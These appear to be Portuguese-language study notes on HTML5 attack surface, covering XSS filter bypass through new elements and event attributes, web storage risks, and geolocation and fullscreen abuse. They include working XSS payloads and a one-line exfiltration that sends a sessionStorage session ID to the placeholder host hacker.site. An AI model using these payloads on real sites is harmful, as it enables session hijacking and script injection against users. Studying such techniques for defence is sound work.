# HTML5 - Intro, Recap & More

## Semantics

Com as atualizações do HTML5 novos elementos foram inseridos como por exemplo, elementos de mídia, tipos de formulário e atributos. 

Com isso podemos usar esses elementos para burlar filtros de blacklisting em ataques de XSS por exemplo

**Form Elements**

Um elemento novo é o <keygen>que possui o atributo autofocus. Útil para explorar XSS sem interação do usuário

```html
<form action="#" method="GET">
	Encryption: <keygen name="security" autofocus onfocus="alert(1);">
</form>
```

**Media Elements**

Além dos elementos \<video> e \<audio> que são comumente usados, também existem os elementos <source>, <track> e \<embed> que possuem o atributo src

```html
<embed src="http://hacker.site/evil.swf">
<embed src="javascript:alert(1)">
```

**Semantic/Structural Elements**

Existem muitos outros elementos usados para melhorar a estrutura da página como:
\<article>, \<figure>, \<footer>, \<header>, \<main>, \<mark>, \<nav>, \<progess>, \<section>, \<summary>, \<time>, etc...

Todos eles suportam Event Attributes

**Attributes**

Existem uma lista enorme de eventos interessantes como: onhashchange, onformchange, onscroll, onresize...

```html
<body onhashchange="alert(1)">
	<a href="#">Click me!</a>
```

## Offline & Storage

Do ponto de vista de segurança, o maior problema com o Web Storage é não ter ciência de quais tipos de dados estão sendo armazenados. Isso permite vários cenários de ataque como: Session Hijacking, User Tracking, Disclosure of Confidential Data, etc...

**Session Hijacking**

Por exemplo, se um desenvolvedor estiver armazenando IDs de sessão usando o sessionStorage, é possível realizar o roubo de sessão explorando um XSS

```javascript
new Image().src="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'))
```

Os mecanismos de web storage não implementam um mecanismo de mitigação do risco, como o HttpOnly

**Attack Scenarios**

Com aplicações web offline, o problema mais crítico é o Cache Poisoning

## Device Access

Uma das funcionalidades mais medonhas implementadas no HTML5 é o Geolocation API. Ela provê acesso a localização do usuário baseado em coordenadas de GPS

Essa API pode ser usada para realizar um tracking do usuário e também para quebrar o anonimato

Outra função interessante é a Fullscreen. Ela permite  que um único elemento seja visto em modo full-screen

O Fullscreen API pode ser usado em ataques de Phishing

## Performance, Integration & Connectivity

No HTML5 muitas funcionalidades foram introduzidas para prover performace e interação com o usuário, como por exemplo, Drag and Drop, HTML editing e Workers

Melhorias também foram feitas na comunicação, com funcionalidades como WebSocket e XMLHttpRequest2

Do ponto de vista de segurança, as funcionalidades mais importantes são: Content Security Policy, Cross-Origin Resource Sharing, Cross-Document Messaging e o reforço de iframes com atributos de Sandboxed

# Exploiting HTML5

